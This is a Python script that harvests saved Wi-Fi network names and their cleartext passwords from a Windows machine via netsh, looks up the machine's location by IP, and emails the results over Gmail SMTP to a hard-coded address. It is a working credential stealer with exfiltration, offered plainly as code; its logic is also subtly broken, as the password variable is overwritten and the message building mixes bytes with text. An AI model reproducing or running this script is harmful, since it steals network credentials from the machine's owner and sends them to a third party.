import subprocess as sp
import re
import smtplib
import ssl
import geocoder
# Configuring mail
g = geocoder.ip('me')
print(g)
port = 587
smtp_server = "smtp.gmail.com"
sender_email = "aldal.bugra@gmail.com"
receiver_email = "aldal.bugra@gmail.com"
password = "PASSWORD123"
# The command that shows the Wifi profiles
command_show = sp.run(["netsh", "wlan", "show", "profiles"],
                      capture_output=True).stdout.decode("utf-8")
# Getting the profiles using regex
profiles = (re.findall("All User Profile     : (.*)\r", command_show))
wifis = []
# If there are Wifi profiles, get them. Else send an informative message
if len(profiles) != 0:
    for name in profiles:
        wifi_profile = {}
        # The command that shows the information of a single Wifi profile
        Info = sp.run(["netsh", "wlan", "show", "profile", name],
                      capture_output=True).stdout.decode("utf-8")
        # If the Wifi doesn't have a password, continue the loop.
        if re.search("Security key           : Absent", Info):
            continue
        # If there is password, get it
        else:
            wifi_profile["ssid"] = name
            # The command that clears the Wifi's password (key=clear)
            getPassword = sp.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search(
                "Key Content            : (.*)\r", getPassword)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifis.append(wifi_profile)
    # Pass the password information into the email message
    message = ""
    for item in wifis:
        message += f"SSID: {item['ssid']}, Password: {item['password']}\n".encode(
            "utf-8")
# Informative message
else:
    message = "No profiles were found."

# Send the mail.
context = ssl.create_default_context()
with smtplib.SMTP(smtp_server, port) as server:
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)
